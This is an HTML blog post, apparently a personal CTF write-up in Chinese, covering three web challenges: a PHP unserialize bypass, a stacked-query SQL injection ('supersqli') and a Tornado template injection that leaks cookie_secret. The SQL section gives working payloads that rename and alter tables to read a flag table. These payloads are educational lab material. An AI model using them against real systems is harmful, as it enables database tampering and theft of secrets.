@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    0508/Web_php_unserialize&amp;supersqli&amp;easy_tornado |
+    
+    MrzBlog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/technology.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-0508/Web_php_unserialize&amp;supersqli&amp;easy_tornado" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      0508/Web_php_unserialize&amp;supersqli&amp;easy_tornado
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/05/25/0508/Web_php_unserialize&supersqli&easy_tornado/" class="article-date">
+  <time datetime="2020-05-25T15:07:14.667Z" itemprop="datePublished">2020-05-25</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><strong>审计+绕过</strong></p>
+<p>绕过点1.正则表达式，将数字前加上“+”</p>
+<p>绕过点2.wakeup函数，将序列化后的属性个数改成一个大于实际属性个数的值</p>
+<h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--1(骚方法)</span><br><span class="line">?inject&#x3D;1&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;-- +</span><br><span class="line"></span><br><span class="line">--2(加id)</span><br><span class="line">inject&#x3D;1&#39;;rename tables &#96;words&#96; to &#96;words1&#96;;rename tables &#96;1919810931114514&#96; to &#96;words&#96;;alter table &#96;words&#96; add &#96;id&#96; int;--+</span><br><span class="line"></span><br><span class="line">--3改（id）</span><br><span class="line">?inject&#x3D;1&#39;;rename tables &#96;words&#96; to &#96;words1&#96;;rename tables &#96;1919810931114514&#96; to &#96;words&#96;;alter table &#96;words&#96; change &#96;flag&#96;  &#96;id&#96; varchar(255);--+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>模板注入</p>
+<p>1.进入hints.txt得到filehash的构造形式，如下图</p>
+<p><img src="C:%5CUsers%5C%E6%9C%B1%E7%9B%88%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200508171933542.png" alt="image-20200508171933542"></p>
+<p>2.来到flag.txt得到flag的路径，即图中的filename，现在只需得到cookie_secret</p>
+<p>3.不构造filehash直接访问/fllllllllllllag,发现url中有get传参msg，可能存在注入。</p>
+<p>4.查询得知cookie_secret在handler.settings中，传参?msg=得到cookie_setting</p>
+<p>5.按照filehash的形式构造哈希传入即可得到flag</p>
+<p><strong>handler类，它代表着业务逻辑，我们进行服务端开发时就是编写一堆一堆的handler用来服务客户端请求。路由表，它将指定的url规则和handler挂接起来，形成一个路由映射表。当请求到来时，根据请求的访问url查询路由映射表来找到相应的业务handler。</strong></p>
+<p>handler 指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所有handler.settings就指向RequestHandler.application.settings了！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://rookiez996.github.io/2020/05/25/0508/Web_php_unserialize&supersqli&easy_tornado/" data-id="ckammmwal0007g8ui0p1i5sl2"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/05/25/0509/shrine&lottery&mfw/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            0509/shrine&amp;lottery&amp;mfw
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/05/25/0507/unserialize3&upload1&Web_python_template_injection/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">0507/unserialize3&amp;upload1&amp;Web_python_template_injection</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
